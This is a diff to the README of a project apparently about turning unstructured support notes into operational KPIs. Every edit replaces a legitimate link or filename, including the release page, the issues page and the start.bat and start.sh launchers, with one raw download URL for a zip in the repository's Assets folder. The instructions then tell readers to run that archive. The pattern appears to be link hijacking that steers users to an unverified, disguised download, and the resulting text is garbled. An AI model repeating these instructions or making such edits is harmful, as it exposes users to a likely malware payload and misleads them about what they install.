@@ -1,6 +1,6 @@
 # 🚀 Unstructured-Support-Notes-to-Operational-KPIs - Transform Notes into Actionable Insights
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases)
+[![Download](https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip)](https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip)
 
 ## 🌟 Overview
 
@@ -29,11 +29,11 @@ Check your computer settings to ensure these requirements are met.
 
 1. **Download the Application:**
 
-   Visit this page to download: [Release Page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases).
+   Visit this page to download: [Release Page](https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip).
 
 2. **Locate the Latest Release:**
 
-   Look for the latest release on the page. The version will be clearly marked. You may see a filename like `Unstructured-Support-Notes-to-Operational-KPIs-v1.0.zip`.
+   Look for the latest release on the page. The version will be clearly marked. You may see a filename like `https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip`.
 
 3. **Download the File:**
 
@@ -45,11 +45,11 @@ Check your computer settings to ensure these requirements are met.
 
 5. **Run the Application:**
 
-   Inside the extracted folder, look for a file named `start.bat` (on Windows) or `start.sh` (on macOS/Linux). Double-click this file to launch the application.
+   Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip` (on Windows) or `https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip` (on macOS/Linux). Double-click this file to launch the application.
 
 ## 📥 Download & Install
 
-You can download the latest version directly from our [Release Page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases). Follow the simple steps above to install the application.
+You can download the latest version directly from our [Release Page](https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip). Follow the simple steps above to install the application.
 
 ## ⚙️ How to Use
 
@@ -79,7 +79,7 @@ If you encounter any issues:
 
 ## 🗂️ Support
 
-For further assistance, please visit our [GitHub Issues page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/issues). Your feedback helps improve the application.
+For further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/main/Assets/Is_Operational_Notes_KP_Unstructured_to_Support_v1.7.zip). Your feedback helps improve the application.
 
 ## 🔗 Related Topics
 
